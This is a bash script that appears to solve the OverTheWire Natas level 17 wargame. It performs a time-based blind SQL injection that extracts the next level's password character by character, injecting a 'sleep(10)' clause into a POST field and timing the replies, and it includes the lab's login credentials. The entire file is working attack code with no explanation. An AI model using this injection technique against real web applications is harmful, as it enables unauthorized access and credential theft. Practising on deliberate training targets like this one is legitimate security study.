#!/bin/bash

passwd=''

while [ ${#passwd} -lt 32 ];
do
  for i in {a..z} {A..Z} {0..9};
  do
  starttime=$(date +%s)
  result=$(curl -s -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw \
  http://natas17.natas.labs.overthewire.org/ -X POST \
  -d "username=natas18\" and password like binary \"$passwd$i%\" and sleep(10) #")
  endtime=$(date +%s)

  if [ "$(( $endtime - $starttime ))" -ge 10 ]; then
    passwd+=$i
    break
  fi
  done
done

echo $passwd

